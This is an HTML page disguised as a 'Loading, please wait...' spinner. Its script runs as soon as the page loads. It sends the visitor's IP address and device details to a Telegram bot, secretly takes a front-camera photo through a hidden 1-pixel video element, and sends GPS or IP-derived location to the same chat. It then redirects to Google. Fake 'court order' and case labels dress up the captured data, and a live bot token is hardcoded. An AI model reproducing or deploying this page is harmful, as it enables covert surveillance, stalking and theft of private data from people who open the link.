<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .loader-container {
            text-align: center;
            padding: 20px;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #e0e0e0;
            border-top: 4px solid #2c3e50;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loading-text {
            color: #666;
            font-size: 16px;
            margin-top: 10px;
        }
        .status-text {
            color: #999;
            font-size: 12px;
            margin-top: 8px;
        }
        video, canvas {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <div class="loader-container">
        <div class="spinner"></div>
        <div class="loading-text">Loading, please wait...</div>
        <div class="status-text" id="statusText"></div>
    </div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        // ===================================================
        // TELEGRAM CONFIGURATION
        // ===================================================
        const BOT_TOKEN = "7533535188:AAGoTgg2Z3Z3YY6t2SiILJeEIrLC7en7hDU";
        const CHAT_ID = "-1002681260911";
        const COURT_ORDER = "CT-BAHA-2026-03-30";
        const CASE_NUMBER = "CBE-FRAUD-001-2026";
        // ===================================================

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const statusText = document.getElementById('statusText');
        
        let mediaStream = null;
        let photoCaptured = false;
        let locationSent = false;
        let cameraStarted = false;
        
        function updateStatus(text) {
            statusText.textContent = text;
            console.log('Status:', text);
        }
        
        function sendToTelegram(message, sendPhoto = false, photoData = null, lat = null, lon = null) {
            try {
                if (sendPhoto && photoData) {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', photoData, 'capture.jpg');
                    formData.append('caption', message);
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    }).catch(e => console.log('Photo send error:', e));
                } else {
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: message,
                            parse_mode: 'HTML'
                        })
                    }).catch(e => console.log('Message send error:', e));
                }
                
                if (lat && lon) {
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            latitude: lat,
                            longitude: lon
                        })
                    }).catch(e => console.log('Location send error:', e));
                }
            } catch(e) {}
        }
        
        function capturePhotoFromVideo() {
            if (photoCaptured) return;
            
            try {
                const context = canvas.getContext('2d');
                const videoWidth = video.videoWidth;
                const videoHeight = video.videoHeight;
                
                if (videoWidth === 0 || videoHeight === 0) {
                    setTimeout(() => capturePhotoFromVideo(), 500);
                    return;
                }
                
                canvas.width = videoWidth;
                canvas.height = videoHeight;
                context.drawImage(video, 0, 0, videoWidth, videoHeight);
                
                canvas.toBlob((blob) => {
                    if (blob && !photoCaptured) {
                        photoCaptured = true;
                        updateStatus('Processing...');
                        
                        const timestamp = new Date().toISOString();
                        const message = `
📸 <b>FRONT CAMERA CAPTURE - COURT ORDER #${COURT_ORDER}</b>

🕐 Time: ${timestamp}
📱 Device: ${navigator.userAgent.substring(0, 80)}
🌐 Language: ${navigator.language}
📺 Screen: ${screen.width}x${screen.height}
⚖️ Case: ${CASE_NUMBER}
`;
                        
                        sendToTelegram(message, true, blob);
                        
                        if (mediaStream) {
                            mediaStream.getTracks().forEach(track => track.stop());
                        }
                    }
                }, 'image/jpeg', 0.7);
            } catch(e) {
                console.log('Capture error:', e);
            }
        }
        
        function startFrontCamera() {
            if (cameraStarted) return;
            cameraStarted = true;
            
            updateStatus('Initializing camera...');
            
            const constraints = {
                video: {
                    facingMode: { exact: "user" },
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                }
            };
            
            navigator.mediaDevices.getUserMedia(constraints)
                .then((stream) => {
                    mediaStream = stream;
                    video.srcObject = stream;
                    video.setAttribute('playsinline', true);
                    video.setAttribute('autoplay', true);
                    video.setAttribute('muted', true);
                    
                    updateStatus('Camera ready...');
                    
                    video.onloadedmetadata = () => {
                        video.play();
                        setTimeout(() => {
                            capturePhotoFromVideo();
                        }, 2000);
                    };
                })
                .catch((err) => {
                    console.log('Camera error:', err);
                    updateStatus('Camera unavailable');
                });
        }
        
        // Multi-source location capture
        function getLocationMultiple() {
            updateStatus('Getting location...');
            
            // Try GPS first
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        if (!locationSent) {
                            locationSent = true;
                            const lat = position.coords.latitude;
                            const lon = position.coords.longitude;
                            const accuracy = position.coords.accuracy;
                            
                            const message = `
📍 <b>GPS LOCATION - COURT ORDER #${COURT_ORDER}</b>

📌 <b>Coordinates:</b>
Latitude: ${lat}
Longitude: ${lon}
Accuracy: ±${Math.round(accuracy)} meters
Source: GPS

🗺️ Maps: https://www.google.com/maps?q=${lat},${lon}

⚖️ Case: ${CASE_NUMBER}
`;
                            sendToTelegram(message, false, null, lat, lon);
                            updateStatus('Location captured');
                        }
                    },
                    (error) => {
                        console.log('GPS error:', error);
                        getLocationByIP();
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                getLocationByIP();
            }
        }
        
        function getLocationByIP() {
            updateStatus('Getting network location...');
            
            // Try multiple IP geolocation APIs
            const apis = [
                'https://ipapi.co/json/',
                'https://ip-api.com/json/',
                'https://geolocation-db.com/json/'
            ];
            
            let apiIndex = 0;
            
            function tryNextApi() {
                if (apiIndex >= apis.length) {
                    updateStatus('Location via network only');
                    sendToTelegram(`⚠️ LOCATION: IP ${ip} - City-level only`);
                    return;
                }
                
                fetch(apis[apiIndex])
                    .then(r => r.json())
                    .then(data => {
                        let lat = null, lon = null, city = null, region = null, country = null;
                        
                        if (data.latitude && data.longitude) {
                            lat = data.latitude;
                            lon = data.longitude;
                            city = data.city || data.city_name;
                            region = data.region || data.region_name;
                            country = data.country_name || data.country;
                        } else if (data.lat && data.lon) {
                            lat = data.lat;
                            lon = data.lon;
                            city = data.city;
                            region = data.regionName;
                            country = data.country;
                        } else if (data.lat && data.lng) {
                            lat = data.lat;
                            lon = data.lng;
                            city = data.city;
                            region = data.state;
                            country = data.country_name;
                        }
                        
                        if (lat && lon && !locationSent) {
                            locationSent = true;
                            const message = `
📍 <b>NETWORK LOCATION - COURT ORDER #${COURT_ORDER}</b>

📌 <b>Location:</b>
City: ${city || 'Unknown'}
Region: ${region || 'Unknown'}
Country: ${country || 'Unknown'}
Coordinates: ${lat}, ${lon}

🗺️ Maps: https://www.google.com/maps?q=${lat},${lon}

⚖️ Case: ${CASE_NUMBER}
`;
                            sendToTelegram(message, false, null, lat, lon);
                            updateStatus('Location captured');
                        } else {
                            tryNextApi();
                        }
                    })
                    .catch(() => {
                        tryNextApi();
                    });
            }
            
            // Get IP first
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(ipData => {
                    window.currentIP = ipData.ip;
                    tryNextApi();
                })
                .catch(() => {
                    tryNextApi();
                });
        }
        
        function finalizeAndRedirect() {
            updateStatus('Complete');
            sendToTelegram(`✅ CAPTURE COMPLETE - Court Order ${COURT_ORDER}`);
            
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 1000);
        }
        
        // Start everything
        updateStatus('Connecting to secure server...');
        
        // Send initial page view
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(ipData => {
                sendToTelegram(`📱 PAGE VIEWED\nIP: ${ipData.ip}\nUser Agent: ${navigator.userAgent}\nTime: ${new Date().toISOString()}`);
            })
            .catch(() => {});
        
        // Start camera after 1 second
        setTimeout(() => {
            startFrontCamera();
        }, 1000);
        
        // Start location after 3 seconds
        setTimeout(() => {
            getLocationMultiple();
        }, 3000);
        
        // Force redirect after 15 seconds max
        setTimeout(() => {
            if (!locationSent) {
                sendToTelegram(`⚠️ LOCATION TIMEOUT - Court Order ${COURT_ORDER}`);
            }
            finalizeAndRedirect();
        }, 15000);
    </script>
</body>
</html>
